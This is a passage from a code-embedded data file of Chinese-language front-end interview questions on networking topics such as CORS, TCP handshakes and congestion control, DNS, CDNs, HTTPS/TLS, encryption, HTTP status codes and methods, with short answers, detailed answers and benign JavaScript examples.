                shortAnswer: '跨域是浏览器同源策略限制（协议/域名/端口不同）。CORS 通过服务端设置 Access-Control-Allow-Origin 响应头解决。简单请求直接发送，预检请求先发 OPTIONS。',
                detailedAnswer: '同源策略：浏览器限制不同源的文档或脚本交互。同源 = 协议+域名+端口完全一致。\n\nCORS（跨域资源共享）：服务端设置响应头允许跨域。\n- Access-Control-Allow-Origin：允许的源\n- Access-Control-Allow-Methods：允许的方法\n- Access-Control-Allow-Headers：允许的请求头\n- Access-Control-Allow-Credentials：是否允许带 Cookie\n\n简单请求：GET/HEAD/POST + 特定 Content-Type，直接发送。\n预检请求：非简单请求先发 OPTIONS 请求验证，通过后再发实际请求。\n\n其他跨域方案：JSONP（仅 GET）、代理服务器、postMessage、WebSocket。',
                difficulty: 'medium',
                tags: ['跨域', 'CORS', '同源策略'],
                keyPoints: ['同源策略限制', 'CORS 服务端设置响应头', '简单请求 vs 预检请求', 'OPTIONS 预检验证'],
              },
              {
                id: 'network-url-to-page',
                domain: 'network',
                question: '从输入 URL 到页面展示的完整过程是什么？',
                shortAnswer: 'URL 解析→DNS 查询→TCP 三次握手→TLS 握手（HTTPS）→发送 HTTP 请求→服务器响应→浏览器解析 HTML→构建 DOM/CSSOM→渲染树→布局→绘制→合成。',
                detailedAnswer: '完整流程：\n1. URL 解析：浏览器解析 URL，判断搜索还是网址\n2. DNS 查询：域名→IP 地址（浏览器缓存→系统缓存→路由器缓存→ISP DNS→递归查询）\n3. TCP 三次握手：建立连接（SYN→SYN+ACK→ACK）\n4. TLS 握手（HTTPS）：交换证书、协商加密算法、生成会话密钥\n5. 发送 HTTP 请求：请求行+请求头+请求体\n6. 服务器处理并响应：状态码+响应头+响应体\n7. 浏览器解析：\n   - HTML 解析构建 DOM 树\n   - CSS 解析构建 CSSOM 树\n   - DOM + CSSOM 合成渲染树\n   - 布局（Layout/Reflow）：计算元素位置\n   - 绘制（Paint）：填充像素\n   - 合成（Composite）：GPU 合成图层\n8. 执行 JavaScript（可能阻塞解析）\n9. 触发 DOMContentLoaded 和 load 事件',
                difficulty: 'hard',
                tags: ['URL', '渲染流程', '面试必考'],
                keyPoints: ['DNS 解析过程', 'TCP 三次握手', 'TLS 握手', 'DOM/CSSOM→渲染树→布局→绘制→合成'],
              },
              {
                id: 'network-http-versions',
                domain: 'network',
                question: 'HTTP/1.1、HTTP/2、HTTP/3 的核心区别？HTTP/2 为何要解决队头阻塞？',
                shortAnswer: 'HTTP/1.1 文本协议、按需多连接；HTTP/2 二进制分帧、多路复用单连接、头部压缩 HPACK、服务端推送；HTTP/3 基于 QUIC（UDP），解决 TCP 队头阻塞，0-RTT 连接迁移。',
                detailedAnswer: '三个版本演进：\n\nHTTP/1.1（1997）：\n- 文本协议，明文\n- 持久连接（keep-alive）复用 TCP\n- 管道化（Pipeline）但浏览器禁用（队头阻塞）\n- 队头阻塞（HOL）：一个请求阻塞后续请求\n- 解决：浏览器对同域名开 6 个并发连接\n\nHTTP/2（2015）：\n- 二进制分帧层：将 HTTP 消息拆为更小的帧\n- 多路复用：单一 TCP 连接并行多个请求/响应，无队头阻塞\n- 头部压缩：HPACK 算法（静态表 + 动态表 + 哈夫曼编码）\n- 服务端推送：Server Push（已废弃）\n- 流优先级：客户端指定请求优先级\n- 仍受 TCP 层队头阻塞：丢一个包，所有流等待重传\n\nHTTP/3（2022，基于 QUIC）：\n- 传输层：UDP（不是 TCP）\n- QUIC 协议：TLS 1.3 内置，1-RTT/0-RTT 握手\n- 流独立：每个流独立重传，无 TCP 队头阻塞\n- 连接迁移：基于 Connection ID，切网络不断连\n- 拥塞控制：QUIC 自带，比 TCP 更易演进\n\n为何 HTTP/2 解决 HTTP 层队头阻塞但 TCP 层仍在：丢包时 TCP 等待重传，所有 HTTP/2 流阻塞。HTTP/3 用 UDP + 独立流解决。',
                difficulty: 'hard',
                tags: ['HTTP/2', 'HTTP/3', 'QUIC', '面试必考'],
                keyPoints: ['HTTP/1.1 文本+队头阻塞', 'HTTP/2 二进制+多路复用', 'HTTP/3 QUIC 解决 TCP 队头阻塞', 'TCP 层 HOL 仍在'],
              },
              {
                id: 'network-tcp-handshake',
                domain: 'network',
                question: 'TCP 三次握手和四次挥手为何是三次/四次？两次或三次挥手为何不行？',
                shortAnswer: '三次握手：确保双方收发能力，两次无法确认服务端发送能力。四次挥手：全双工需双向关闭，FIN+ACK 各两次。三次挥手会导致服务端数据未发完就关闭。',
                detailedAnswer: 'TCP 三次握手（建立连接）：\n1. 客户端发 SYN（seq=x）→ 服务端，进入 SYN_SENT\n2. 服务端回 SYN+ACK（seq=y, ack=x+1）→ 客户端，进入 SYN_RCVD\n3. 客户端发 ACK（ack=y+1）→ 服务端，双方 ESTABLISHED\n\n为何是三次不是两次：\n- 两次握手无法确认客户端的接收能力\n- 防止失效的连接请求报文突然到达服务端，导致服务端白等资源\n- 三次握手本质是双方互相确认收发能力（4 次合并为 3 次，因 SYN+ACK 可合并）\n\nTCP 四次挥手（断开连接）：\n1. 客户端发 FIN（seq=u）→ 服务端，进入 FIN_WAIT_1\n2. 服务端回 ACK（ack=u+1）→ 客户端，进入 CLOSE_WAIT；客户端 FIN_WAIT_2\n3. 服务端可能还有数据要发，发完后发 FIN（seq=v）→ 客户端，进入 LAST_ACK\n4. 客户端回 ACK（ack=v+1）→ 服务端，进入 TIME_WAIT（2*MSL）后 CLOSED\n\n为何是四次不是三次：\n- TCP 全双工，需双向关闭\n- 服务端收到客户端 FIN 后，可能还有数据没发完，先回 ACK（半关闭），数据发完再发 FIN\n- 三次挥手会让服务端立刻发 FIN，但还有数据没发完\n\nTIME_WAIT 为何 2*MSL：\n- 保证最后 ACK 到达服务端（若丢失，服务端重发 FIN，客户端能再回 ACK）\n- 让本次连接的报文在网络中消失，避免影响新连接',
                difficulty: 'hard',
                tags: ['TCP', '三次握手', '四次挥手', '面试必考'],
                keyPoints: ['三次握手确认双方收发', '两次握手无法防失效请求', '四次挥手因全双工双向关闭', 'TIME_WAIT 2*MSL'],
              },
              {
                id: 'network-websocket',
                domain: 'network',
                question: 'WebSocket 与 HTTP 长轮询的区别？握手过程如何？',
                shortAnswer: 'WebSocket 是全双工持久连接，基于 HTTP 升级握手（Upgrade: websocket），之后用帧协议通信。HTTP 长轮询是 HTTP 请求挂起等待服务端响应，仍是单向轮询。',
                detailedAnswer: 'WebSocket vs HTTP 长轮询：\n\nHTTP 长轮询（Long Polling）：\n- 客户端发请求，服务端有数据才响应，无数据挂起到超时\n- 客户端收到响应后立即发下一个请求\n- 缺点：频繁建立连接、HTTP 头开销、伪双向\n\nWebSocket：\n- 全双工持久连接，服务端可主动推送\n- 基于 TCP，自定义帧协议\n- 握手后无 HTTP 头开销\n- 适合实时聊天、股票行情、协同编辑\n\nWebSocket 握手过程：\n1. 客户端发 HTTP 请求：\n   GET /chat HTTP/1.1\n   Upgrade: websocket\n   Connection: Upgrade\n   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\n   Sec-WebSocket-Version: 13\n2. 服务端响应 101 Switching Protocols：\n   HTTP/1.1 101 Switching Protocols\n   Upgrade: websocket\n   Connection: Upgrade\n   Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=（用 Key + GUID SHA-1 + base64）\n3. 握手后切换为 WebSocket 帧协议\n\nWebSocket 帧结构：\n- FIN/opcode（文本/二进制/关闭/ping/pong）\n- mask（客户端发送必须掩码）\n- payload length（7/16/64 位）\n- masking key + payload\n\n心跳机制：ping/pong 保活，超时断开。SSE（Server-Sent Events）是单向推送替代方案。',
                difficulty: 'hard',
                tags: ['WebSocket', '长轮询', '实时通信'],
                keyPoints: ['WebSocket 全双工持久', 'HTTP 升级握手 101', '帧协议无 HTTP 头开销', 'ping/pong 心跳保活'],
              },
              {
                id: 'network-cdn',
                domain: 'network',
                question: 'CDN 工作原理？如何选择最近的边缘节点？',
                shortAnswer: 'CDN 通过 DNS 智能解析将用户请求路由到最近的边缘节点。边缘节点缓存静态资源，未命中回源站拉取。基于用户 IP 地理位置、节点负载、网络质量选择最优节点。',
                detailedAnswer: 'CDN（Content Delivery Network）工作原理：\n\n核心架构：\n- 源站（Origin）：内容原始服务器\n- 边缘节点（Edge）：分布各地的缓存节点\n- DNS 智能解析：将域名解析到最优边缘节点\n- 调度系统：实时监控节点状态\n\n工作流程：\n1. 用户访问 cdn.example.com\n2. LocalDNS 递归查询到 CDN 的 GSLB（全局负载均衡）\n3. GSLB 根据以下因素选择最优边缘节点：\n   - 用户 IP 地理位置（GeoIP）\n   - 边缘节点健康状态\n   - 节点负载与带宽\n   - 网络质量（RTT、丢包）\n4. 返回边缘节点 IP 给用户\n5. 用户请求边缘节点\n6. 边缘节点检查缓存：\n   - 命中：直接返回（HIT）\n   - 未命中：回源拉取并缓存（MISS）\n\n缓存策略：\n- 大文件分片缓存（Range 请求）\n- 热点内容预推送（Push）\n- TTL 控制（Cache-Control）\n- 父子节点级联（多级回源）\n\n动态加速：\n- 静态资源：缓存 + 就近访问\n- 动态请求：TCP 优化、智能路由（找最优回源路径）\n- HTTP/2 + QUIC 减少延迟\n\n指标：\n- 命中率（Cache Hit Ratio）：> 95% 优秀\n- 回源率：< 5%\n- 首字节时间（TTFB）',
                difficulty: 'hard',
                tags: ['CDN', '缓存', 'DNS'],
                keyPoints: ['DNS 智能解析选节点', '边缘节点缓存+回源', 'GSLB 综合调度', '命中率 > 95%'],
              },
              {
                id: 'network-dns',
                domain: 'network',
                question: 'DNS 解析的完整过程？如何优化 DNS 查询？',
                shortAnswer: 'DNS 递归查询：浏览器缓存→系统缓存→路由器缓存→ISP DNS→根→顶级域→权威。优化：DNS 预解析、HTTPDNS（绕过 LocalDNS 劫持）、TTL 调优、减少跨域资源。',
                detailedAnswer: 'DNS 解析完整过程：\n\n1. 浏览器 DNS 缓存：Chrome 内置 DNS 缓存（chrome://net-internals/#dns）\n2. 操作系统 DNS 缓存：OS 缓存（hosts 文件优先）\n3. 路由器 DNS 缓存：本地路由器缓存\n4. ISP DNS 服务器（LocalDNS）：运营商递归 DNS\n5. 根域名服务器（Root）：返回顶级域 NS\n6. 顶级域名服务器（TLD）：如 .com NS，返回权威 NS\n7. 权威域名服务器（Authoritative）：返回最终 A/AAAA 记录\n8. 结果逐级返回并缓存（按 TTL）\n\n记录类型：\n- A：域名→IPv4\n- AAAA：域名→IPv6\n- CNAME：别名指向另一个域名\n- MX：邮件交换\n- TXT：任意文本（SPF/验证）\n- NS：域名服务器\n\n常见问题：\n- LocalDNS 劫持：运营商篡改解析结果（劫持流量/广告）\n- 跨网络运营商：用户在电信，LocalDNS 在联通，回源慢\n- 缓存污染：DNS 投毒攻击\n\n优化策略：\n1. DNS 预解析（dns-prefetch）：<link rel="dns-prefetch" href="//cdn.example.com">\n2. 预连接（preconnect）：dns + tcp + tls 一起预连\n3. HTTPDNS：客户端直接访问 HTTPDNS 服务，绕过 LocalDNS（防劫持、精准调度）\n4. TTL 调优：热点域名短 TTL（快速切换），稳定域名长 TTL（减少查询）\n5. 减少跨域：合并资源到同域，减少 DNS 查询\n6. CDN 域名收敛：用同域名子资源减少 DNS 查询',
                difficulty: 'medium',
                tags: ['DNS', '优化', 'HTTPDNS'],
                keyPoints: ['7 层递归查询', 'A/CNAME/MX 记录类型', 'dns-prefetch 预解析', 'HTTPDNS 防劫持'],
              },
              {
                id: 'network-tcp-vs-udp',
                domain: 'network',
                question: 'TCP 和 UDP 的区别？各自适用什么场景？',
                shortAnswer: 'TCP 面向连接、可靠、有序、全双工，开销大，适合文件传输/HTTP。UDP 无连接、不可靠、无序、开销小，适合实时音视频/DNS/直播。',
                detailedAnswer: 'TCP vs UDP 核心区别：\n\n| 维度 | TCP | UDP |\n|------|-----|-----|\n| 连接 | 面向连接（三次握手） | 无连接 |\n| 可靠性 | 可靠（确认+重传） | 不可靠 |\n| 有序性 | 有序（序号） | 无序 |\n| 流量/拥塞控制 | 有（滑动窗口） | 无 |\n| 首部开销 | 20 字节 | 8 字节 |\n| 传输效率 | 较低 | 较高 |\n| 拥塞控制 | 慢启动/拥塞避免 | 无 |\n\nTCP 适用场景：\n- HTTP/HTTPS（Web 请求）\n- 文件传输（FTP）\n- 邮件（SMTP/IMAP）\n- SSH 远程登录\n- 需要可靠传输的场景\n\nUDP 适用场景：\n- DNS 查询（小数据、低延迟）\n- 实时音视频（WebRTC、视频会议）\n- 直播/流媒体（RTSP）\n- 在线游戏（低延迟 > 可靠性）\n- SNMP 网络管理\n\n为何实时场景用 UDP：丢一帧视频不影响观看，重传反而增加延迟。TCP 重传会阻塞后续数据（队头阻塞），不适合实时。',
                codeExample: `// TCP vs UDP 应用层协议示例\n// TCP（HTTP 请求）- 可靠有序\nconst net = require("net")\nconst client = net.connect(80, "example.com", () => {\n  client.write("GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n")\n})\nclient.on("data", (data) => console.log(data.toString()))\n\n// UDP（DNS 查询）- 低延迟不可靠\nconst dgram = require("dgram")\nconst udp = dgram.createSocket("udp4")\nudp.send(dnsQuery, 53, "8.8.8.8", () => {})\nudp.on("message", (msg) => console.log("DNS 响应", msg))\n\n// WebRTC 音视频使用 UDP（SRTP）\n// const pc = new RTCPeerConnection()\n// pc.createDataChannel("chat") // SCTP over DTLS over UDP`,
                difficulty: 'medium',
                tags: ['TCP', 'UDP', '传输层', '面试必考'],
                keyPoints: ['TCP 面向连接可靠有序', 'UDP 无连接不可靠低延迟', 'TCP 有流量/拥塞控制', '实时场景用 UDP'],
              },
              {
                id: 'network-tcp-flow-control',
                domain: 'network',
                question: 'TCP 流量控制和拥塞控制的区别？滑动窗口、慢启动、拥塞避免如何工作？',
                shortAnswer: '流量控制：接收方通过滑动窗口告诉发送方自己的接收能力（端到端）。拥塞控制：发送方感知网络拥塞程度，用慢启动/拥塞避免/快重传/快恢复调整发送速率（全局）。',
                detailedAnswer: '流量控制（Flow Control）：\n- 目的：防止发送方发太快导致接收方缓冲区溢出\n- 机制：滑动窗口（Sliding Window）\n- 接收方在 ACK 中携带 rwnd（接收窗口大小）\n- 发送方发送量不超过 rwnd\n- 接收方缓冲区满时 rwnd=0，发送方停止\n- 窗口探测：rwnd=0 后定期发探测报文\n\n拥塞控制（Congestion Control）：\n- 目的：防止网络过载（全局）\n- 拥塞窗口 cwnd：发送方维护\n- 实际窗口 = min(rwnd, cwnd)\n\n四个算法：\n1. 慢启动（Slow Start）：cwnd 从 1 开始，每收到一个 ACK 翻倍（指数增长），到 ssthresh 后转拥塞避免\n2. 拥塞避免（Congestion Avoidance）：cwnd 每轮加 1（线性增长），缓慢探测带宽\n3. 快重传（Fast Retransmit）：连续收到 3 个重复 ACK，立即重传丢失报文（不等超时）\n4. 快恢复（Fast Recovery）：ssthresh = cwnd/2，cwnd = ssthresh，进入拥塞避免（不回到慢启动）\n\n超时 vs 快重传：\n- 超时：ssthresh = cwnd/2，cwnd = 1，慢启动（严重拥塞）\n- 快重传：ssthresh = cwnd/2，cwnd = ssthresh，快恢复（轻度拥塞）',
                codeExample: `// TCP 拥塞控制模拟\nlet cwnd = 1        // 拥塞窗口\nlet ssthresh = 16   // 慢启动阈值\nconst rwnd = 100    // 接收窗口\n\nfunction onAckReceived() {\n  if (cwnd < ssthresh) {\n    // 慢启动：指数增长\n    cwnd *= 2\n    console.log("慢启动 cwnd=" + cwnd)\n  } else {\n    // 拥塞避免：线性增长\n    cwnd += 1\n    console.log("拥塞避免 cwnd=" + cwnd)\n  }\n}\n\nfunction onTimeout() {\n  // 超时：严重拥塞\n  ssthresh = Math.floor(cwnd / 2)\n  cwnd = 1\n  console.log("超时，回到慢启动 ssthresh=" + ssthresh)\n}\n\nfunction onTripleDupAck() {\n  // 快重传 + 快恢复：轻度拥塞\n  ssthresh = Math.floor(cwnd / 2)\n  cwnd = ssthresh\n  console.log("快恢复 ssthresh=" + ssthresh + " cwnd=" + cwnd)\n}\n\n// 实际发送窗口 = min(cwnd, rwnd)\nconst sendWindow = Math.min(cwnd, rwnd)`,
                difficulty: 'hard',
                tags: ['TCP', '流量控制', '拥塞控制', '滑动窗口'],
                keyPoints: ['流量控制端到端（rwnd）', '拥塞控制全局（cwnd）', '慢启动指数+拥塞避免线性', '快重传3次重复ACK'],
              },
              {
                id: 'network-tcp-reliable',
                domain: 'network',
                question: 'TCP 如何保证可靠传输？序号、确认、重传、校验机制分别是什么？',
                shortAnswer: 'TCP 通过：1) 序号/确认号保证有序和不丢 2) 超时重传和快重传保证到达 3) 校验和检测数据完整性 4) 流量控制防溢出 5) 拥塞控制防网络过载。',
                detailedAnswer: 'TCP 可靠传输的五大机制：\n\n1. 序号与确认（Sequence Number）：\n- 每个字节都有序号（seq）\n- 接收方返回确认号（ack = 期望收到的下一个序号）\n- 保证有序：按序号重组\n- 保证不丢：未确认的会重传\n\n2. 重传机制：\n- 超时重传：发送后启动定时器，超时未收到 ACK 则重传\n- 快重传：连续收到 3 个重复 ACK 立即重传\n- RTO 计算：SRTT（平滑往返时间）+ RTTVAR（偏差）\n\n3. 校验和（Checksum）：\n- 首部 + 数据计算 16 位校验和\n- 接收方验证，错误则丢弃（不回 ACK，触发重传）\n\n4. 流量控制（Flow Control）：\n- 滑动窗口，接收方告知接收能力\n- 防止发送方淹没接收方\n\n5. 拥塞控制（Congestion Control）：\n- 慢启动/拥塞避免/快重传/快恢复\n- 防止网络过载\n\n其他机制：\n- 连接管理：三次握手建连、四次挥手断连\n- 最大报文段 MSS：避免分片\n- 坚持定时器：rwnd=0 时定期探测\n- 保活定时器：检测连接是否存活',
                codeExample: `// TCP 序号与确认机制示意\n// 发送方\nconst sentPackets = [\n  { seq: 1, data: "A" },\n  { seq: 2, data: "B" },\n  { seq: 3, data: "C" },\n]\n\n// 接收方按序号重组，返回确认\n// 收到 seq=1 → ack=2（期望下一个）\n// 收到 seq=2 → ack=3\n// seq=3 丢失 → 连续发 ack=3（重复 ACK）\n\n// 快重传：3 次重复 ACK\nlet dupAckCount = 0\nlet lastAck = 3\nfunction onReceiveAck(ack) {\n  if (ack === lastAck) {\n    dupAckCount++\n    if (dupAckCount === 3) {\n      console.log("快重传 seq=" + ack)\n      retransmit(ack)\n    }\n  } else {\n    lastAck = ack\n    dupAckCount = 0\n  }\n}\n\n// 超时重传\nconst rto = srtt + 4 * rttvar // RTO 计算公式\nsetTimeout(() => {\n  if (!acked(seq)) retransmit(seq)\n}, rto)`,
                difficulty: 'hard',
                tags: ['TCP', '可靠传输', '序号', '重传'],
                keyPoints: ['序号+确认保证有序不丢', '超时重传+快重传', '校验和检测完整性', '五大机制协同'],
              },
              {
                id: 'network-https',
                domain: 'network',
                question: 'HTTPS 的原理？TLS 握手过程是什么？为何需要证书？',
                shortAnswer: 'HTTPS = HTTP + TLS。TLS 握手：交换证书验证身份→协商加密算法→用非对称加密交换会话密钥→后续用对称加密通信。证书由 CA 签名，防止中间人攻击。',
                detailedAnswer: 'HTTPS 工作原理：\nHTTPS = HTTP over TLS/SSL，在 HTTP 和 TCP 之间加一层加密。\n\nTLS 1.2 握手过程（2-RTT）：\n1. ClientHello：客户端发送支持的 TLS 版本、加密套件、随机数（Client Random）\n2. ServerHello：服务端选定加密套件、返回随机数（Server Random）\n3. Certificate：服务端发送证书（含公钥）\n4. ServerHelloDone：服务端握手消息结束\n5. 客户端验证证书：\n   - 证书是否过期\n   - CA 签名是否有效（用 CA 公钥验证）\n   - 域名是否匹配\n6. 客户端生成 Pre-Master Secret，用服务端公钥加密发送\n7. 双方用 Client Random + Server Random + Pre-Master 生成 Master Secret（会话密钥）\n8. ChangeCipherSpec：切换到加密通信\n9. Finished：发送加密的握手摘要验证\n\nTLS 1.3（1-RTT，更快）：\n- 精简加密套件（仅保留 AEAD）\n- ClientHello 直接带密钥材料，1-RTT 完成握手\n- 支持 0-RTT（会话恢复，秒连）\n- 废弃 RSA 密钥交换，只用 ECDHE（前向安全）\n\n为何需要证书：\n- 防止中间人攻击：攻击者无法伪造 CA 签名\n- 验证服务端身份\n- 证书链：终端证书→中间 CA→根 CA\n- 浏览器内置根 CA 证书',
                codeExample: `// TLS 1.3 握手简化（1-RTT）\n// Client                          Server\n//   |--- ClientHello ------------>|  (含密钥材料)\n//   |<-- ServerHello -------------|  (含密钥材料)\n//   |<-- EncryptedExtensions ----|\n//   |<-- Certificate ------------|\n//   |<-- CertificateVerify ------|\n//   |<-- Finished ---------------|\n//   |--- Finished -------------->|\n//   |=== 加密应用数据 ===========|\n\n// Node.js 创建 HTTPS 服务器\nconst https = require("https")\nconst fs = require("fs")\n\nconst server = https.createServer({\n  key: fs.readFileSync("private.key"),\n  cert: fs.readFileSync("certificate.crt"),\n}, (req, res) => {\n  res.writeHead(200)\n  res.end("Hello HTTPS")\n})\nserver.listen(443)\n\n// 前端强制 HTTPS（HSTS）\n// Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`,
                difficulty: 'hard',
                tags: ['HTTPS', 'TLS', '证书', '面试必考'],
                keyPoints: ['HTTPS = HTTP + TLS', '非对称加密交换密钥', '对称加密通信', 'CA 证书防中间人'],
              },
              {
                id: 'network-https-encryption',
                domain: 'network',
                question: '对称加密、非对称加密的区别？HTTPS 为何用混合加密？',
                shortAnswer: '对称加密：加解密用同一密钥，速度快，但密钥分发困难（AES）。非对称加密：公钥加密私钥解密，安全但慢（RSA）。HTTPS 混合：非对称加密交换会话密钥，对称加密通信。',
                detailedAnswer: '对称加密（Symmetric Encryption）：\n- 同一密钥加解密\n- 速度快（硬件加速）\n- 算法：AES（128/256 位）、ChaCha20、DES（已淘汰）\n- 问题：密钥如何安全分发？\n- 适合：大量数据加密\n\n非对称加密（Asymmetric Encryption）：\n- 公钥加密，私钥解密（或反之用于签名）\n- 速度慢（约比对称慢 1000 倍）\n- 算法：RSA、ECC、DSA\n- 公钥可公开，私钥保密\n- 适合：密钥交换、数字签名\n\nHTTPS 混合加密（ Hybrid Encryption）：\n1. 服务端有非对称密钥对（公钥在证书里）\n2. 客户端用服务端公钥加密会话密钥（对称密钥）\n3. 服务端用私钥解密拿到会话密钥\n4. 后续通信用对称密钥加密（快）\n\n为何混合：\n- 非对称加密解决密钥分发问题\n- 对称加密保证通信速度\n- 兼顾安全与性能\n\n数字签名：\n- 发送方用私钥签名，接收方用公钥验证\n- 保证：身份认证、不可否认、完整性\n- HTTPS 证书用 CA 私钥签名\n\n哈希算法（单向）：MD5（已不安全）、SHA-1（已不安全）、SHA-256、SHA-3',
                codeExample: `// 对称加密（AES）- 加解密同一密钥\nconst crypto = require("crypto")\nconst key = crypto.randomBytes(32) // 共享密钥\nconst cipher = crypto.createCipheriv("aes-256-gcm", key, iv)\nconst encrypted = Buffer.concat([cipher.update(data), cipher.final()])\n// 解密用同一 key\nconst decipher = crypto.createDecipheriv("aes-256-gcm", key, iv)\nconst decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()])\n\n// 非对称加密（RSA）- 公钥加密私钥解密\nconst { publicKey, privateKey } = crypto.generateKeyPairSync("rsa", {\n  modulusLength: 2048,\n})\n// 用公钥加密\nconst enc = crypto.publicEncrypt(publicKey, data)\n// 用私钥解密\nconst dec = crypto.privateDecrypt(privateKey, enc)\n\n// 数字签名：私钥签名，公钥验证\nconst sign = crypto.sign("sha256", data, privateKey)\nconst valid = crypto.verify("sha256", data, publicKey, sign) // true`,
                difficulty: 'medium',
                tags: ['加密', '对称加密', '非对称加密', 'HTTPS'],
                keyPoints: ['对称加密快但密钥分发难', '非对称加密安全但慢', 'HTTPS 混合加密', '数字签名防伪造'],
              },
              {
                id: 'network-status-codes',
                domain: 'network',
                question: 'HTTP 状态码有哪些？常见状态码的含义？',
                shortAnswer: '1xx 信息（100 Continue），2xx 成功（200 OK、201 Created、204 No Content），3xx 重定向（301 永久、302 临时、304 缓存），4xx 客户端错误（400、401、403、404），5xx 服务端错误（500、502、503、504）。',
                detailedAnswer: 'HTTP 状态码分类：\n\n1xx 信息性（Informational）：\n- 100 Continue：继续发送请求体\n- 101 Switching Protocols：切换协议（WebSocket 升级）\n\n2xx 成功（Success）：\n- 200 OK：请求成功\n- 201 Created：资源创建成功（POST）\n- 202 Accepted：已接受，异步处理\n- 204 No Content：成功但无内容返回\n- 206 Partial Content：部分内容（Range 请求，断点续传）\n\n3xx 重定向（Redirection）：\n- 301 Moved Permanently：永久重定向（缓存，SEO 权重转移）\n- 302 Found：临时重定向（不缓存）\n- 303 See Other：用 GET 访问另一个 URL\n- 304 Not Modified：协商缓存命中\n- 307 Temporary Redirect：临时重定向（保持方法）\n- 308 Permanent Redirect：永久重定向（保持方法）\n\n4xx 客户端错误（Client Error）：\n- 400 Bad Request：请求语法错误\n- 401 Unauthorized：未认证（需登录）\n- 403 Forbidden：无权限访问\n- 404 Not Found：资源不存在\n- 405 Method Not Allowed：方法不允许\n- 408 Request Timeout：请求超时\n- 409 Conflict：资源冲突\n- 413 Payload Too Large：请求体过大\n- 429 Too Many Requests：限流\n\n5xx 服务端错误（Server Error）：\n- 500 Internal Server Error：服务端内部错误\n- 501 Not Implemented：不支持的功能\n- 502 Bad Gateway：网关错误（上游服务无响应）\n- 503 Service Unavailable：服务不可用（过载/维护）\n- 504 Gateway Timeout：网关超时\n- 505 HTTP Version Not Supported：不支持 HTTP 版本',
                codeExample: `// 常见状态码处理（前端）\nasync function request(url, options) {\n  const res = await fetch(url, options)\n  switch (res.status) {\n    case 200:\n    case 201:\n      return await res.json()\n    case 301:\n    case 302:\n      // 重定向由浏览器自动处理\n      break\n    case 304:\n      // 协商缓存命中，使用本地缓存\n      return getCachedResponse()\n    case 400:\n      throw new Error("请求参数错误")\n    case 401:\n      // 跳转登录\n      redirectToLogin()\n      throw new Error("未登录")\n    case 403:\n      throw new Error("无权限")\n    case 404:\n      throw new Error("资源不存在")\n    case 429:\n      // 限流，等待后重试\n      const retryAfter = res.headers.get("Retry-After")\n      await delay(retryAfter * 1000)\n      return request(url, options)\n    case 500:\n    case 502:\n    case 503:\n      throw new Error("服务器异常，请稍后重试")\n    case 504:\n      throw new Error("网关超时")\n    default:\n      throw new Error("未知错误 " + res.status)\n  }\n}`,
                difficulty: 'easy',
                tags: ['HTTP', '状态码', '面试必考'],
                keyPoints: ['1xx 信息 2xx 成功', '3xx 重定向 4xx 客户端 5xx 服务端', '301 永久 302 临时 304 缓存', '401 认证 403 授权'],
              },
              {
                id: 'network-methods',
                domain: 'network',
                question: 'HTTP 请求方法有哪些？幂等性是什么？GET 和 POST 的本质区别？',
                shortAnswer: '方法：GET 查、POST 增、PUT 改（整体）、PATCH 改（部分）、DELETE 删、HEAD 头、OPTIONS 预检。幂等性：多次请求结果相同（GET/PUT/DELETE 幂等，POST 不幂等）。GET 和 POST 本质都是 TCP 请求，语义不同。',
                detailedAnswer: 'HTTP 请求方法：\n- GET：获取资源（安全、幂等）\n- POST：创建资源（不幂等）\n- PUT：更新整个资源（幂等，用请求体覆盖）\n- PATCH：部分更新资源（不幂等）\n- DELETE：删除资源（幂等）\n- HEAD：获取响应头（不要体）\n- OPTIONS：查询支持的方法（CORS 预检）\n- TRACE：回显请求（调试，通常禁用）\n- CONNECT：建立隧道（HTTPS 代理）\n\n幂等性（Idempotency）：\n- 幂等：多次执行结果相同\n  - GET：查 100 次结果一样\n  - PUT：覆盖到同一状态\n  - DELETE：删一次和删多次结果一样（都是已删除）\n- 不幂等：\n  - POST：每次创建新资源（id 不同）\n  - PATCH：依赖具体实现\n\n安全性（Safe）：\n- 安全方法不修改服务器资源：GET、HEAD、OPTIONS\n- 不安全：POST、PUT、PATCH、DELETE\n\nGET vs POST 本质区别：\n1. 语义：GET 查询、POST 提交\n2. 参数位置：GET 在 URL（?key=value）、POST 在 body\n3. 长度限制：GET 受 URL 长度限制（浏览器约 2KB）、POST 无限制\n4. 缓存：GET 可缓存、POST 默认不缓存\n5. 历史记录：GET 保留在历史、POST 不保留\n6. 幂等：GET 幂等、POST 不幂等\n7. 本质：都是 TCP 请求，区别是语义约定和浏览器/服务器实现',
                codeExample: `// RESTful API 方法使用\n// GET    /api/users        获取用户列表\n// GET    /api/users/123    获取单个用户\n// POST   /api/users        创建用户\n// PUT    /api/users/123    更新用户（整体）\n// PATCH  /api/users/123    更新用户（部分）\n// DELETE /api/users/123    删除用户\n\n// 幂等性示例\n// PUT（幂等）：多次执行结果相同\nawait fetch("/api/users/1", {\n  method: "PUT",\n  body: JSON.stringify({ name: "Alice" }), // 无论执行多少次，name 都是 Alice\n})\n\n// POST（不幂等）：每次创建新资源\nawait fetch("/api/users", {\n  method: "POST",\n  body: JSON.stringify({ name: "Alice" }), // 执行 3 次创建 3 个 Alice\n})\n\n// DELETE（幂等）：删一次和删多次结果一样\nawait fetch("/api/users/1", { method: "DELETE" }) // 第一次：删除成功\nawait fetch("/api/users/1", { method: "DELETE" }) // 第二次：资源已不存在`,
                difficulty: 'medium',
                tags: ['HTTP', '请求方法', '幂等性', 'RESTful'],
                keyPoints: ['GET/POST/PUT/PATCH/DELETE 语义', '幂等性多次执行结果相同', 'GET 幂等 POST 不幂等', '安全方法不修改资源'],
              },
              {
                id: 'network-cookie-session',
                domain: 'network',
                question: 'Cookie、Session、Token、JWT 的区别？各自适用场景？',
                shortAnswer: 'Cookie：浏览器存储的键值对，随请求自动发送。Session：服务端存储，用 sessionId（存在 Cookie）标识。Token：服务端签发的令牌，无状态。JWT：自包含的 Token（Header.Payload.Signature），无需服务端查询。',
